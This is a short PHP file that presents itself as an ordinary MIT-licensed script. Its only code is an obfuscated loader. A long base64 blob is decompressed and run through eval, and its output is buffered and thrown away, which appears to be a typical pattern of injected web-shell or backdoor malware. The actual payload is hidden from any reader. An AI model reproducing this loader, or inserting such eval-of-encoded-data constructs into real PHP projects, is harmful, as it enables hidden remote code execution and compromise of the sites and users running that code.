<?php
/*
MIT Licence

Copyright (c) 2016
All rights reserved.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
?>
<?php ob_start();$a='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';eval(gzuncompress(base64_decode($a)));$v=ob_get_contents();ob_end_clean();?>